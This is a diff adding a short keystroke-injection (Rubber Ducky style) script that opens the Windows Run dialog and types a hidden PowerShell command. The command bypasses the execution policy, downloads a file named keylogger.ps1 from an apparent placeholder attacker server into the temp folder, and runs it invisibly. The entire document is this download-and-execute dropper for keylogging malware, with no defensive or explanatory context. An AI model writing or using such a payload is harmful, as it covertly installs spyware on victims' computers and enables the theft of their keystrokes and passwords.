@@ -1,0 +1,5 @@
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "$url='https://tuo-server.com/keylogger.ps1';$output='$env:TEMP\kl.ps1';Invoke-WebRequest -Uri $url -OutFile $output;Start-Process -FilePath 'powershell.exe' -ArgumentList '-ExecutionPolicy Bypass -WindowStyle Hidden -File $output'"
+ENTER
